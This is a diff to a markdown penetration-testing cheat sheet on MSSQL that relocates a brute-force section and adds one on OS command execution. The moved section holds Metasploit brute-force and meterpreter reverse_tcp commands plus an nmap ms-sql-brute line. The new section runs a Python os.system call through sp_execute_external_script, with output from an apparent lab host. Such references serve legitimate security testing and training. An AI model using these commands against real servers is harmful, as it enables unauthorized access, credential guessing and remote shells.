@@ -485,6 +485,27 @@ SQL> EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];
 COMPATIBILITY\POO_CONFIG 
 ```
 
+## Bruteforce login
+
+### Metasploit
+
+#### Bruteforce MSSQL Login 
+
+`msf > use auxiliary/admin/mssql/mssql_login` 
+
+#### Metasploit MSSQL Shell 
+
+```text
+msf > use exploit/windows/mssql/mssql_payload 
+msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+### Nmap
+
+```text
+nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>
+```
+
 ## Enable xp\_cmdshell
 
 ### Check if enabled 
@@ -574,24 +595,17 @@ It doesn’t return anything, but in the responder window, I’ve captured the n
 [*] Skipping previously captured hash for QUERIER\mssql-svc 
 ```
 
-## Bruteforce login
+## Execue\_external\_script
 
-### Metasploit
+We can use `sp_execute_external_scrip` to execute external command, 
 
-#### Bruteforce MSSQL Login 
-
-`msf > use auxiliary/admin/mssql/mssql_login` 
-
-#### Metasploit MSSQL Shell 
+**SQL Server 2017** now supports Python as an extensible script engine and we can use it to execute commands:
 
 ```text
-msf > use exploit/windows/mssql/mssql_payload 
-msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
-```
+SQL> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
+compatibility\poo_public01
 
-### Nmap
-
-```text
-nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>
+Express Edition will continue to be enforced.
 ```
 
